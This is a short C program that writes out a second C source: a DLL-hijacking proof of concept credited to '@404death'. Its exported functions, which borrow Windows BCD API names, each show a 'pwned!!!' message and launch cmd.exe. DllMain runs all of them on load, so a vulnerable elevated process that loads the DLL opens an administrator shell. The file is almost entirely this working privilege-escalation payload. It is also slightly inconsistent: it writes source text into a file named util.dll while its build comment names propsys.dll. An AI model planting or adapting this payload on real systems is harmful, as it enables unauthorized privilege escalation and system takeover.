#include <stdio.h>

int main(){
    int i;
	FILE *fp;
	fp = fopen("util.dll", "w");
	char str[]  = "guru \n";

	fprintf(fp, R"EOF(#include <windows.h>
#include <Winuser.h>

// x86-w64-mingw32-gcc -shared -o propsys.dll propsys.c -lcomctl32 -Wl,--subsystem,windows

//  @404death

int BcdCloseObject(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int BcdCloseStore(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int BcdOpenObject(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}
int BcdOpenSystemStore(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}

int BcdSetElementData(){
    MessageBox(0, "Spawnning shell as Administrator", "pwned!!!", MB_OK);
    WinExec("C:\\windows\\system32\\cmd.exe", 1);
    ExitProcess(0);
    return 0;
}

BOOL WINAPI DllMain (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  if (fdwReason == DLL_PROCESS_ATTACH)
  {
    BcdCloseObject();
    BcdCloseStore();
    BcdOpenObject();
    BcdOpenSystemStore();
    BcdSetElementData();
  }

  return TRUE;
}
    )EOF");

	return 0;
}
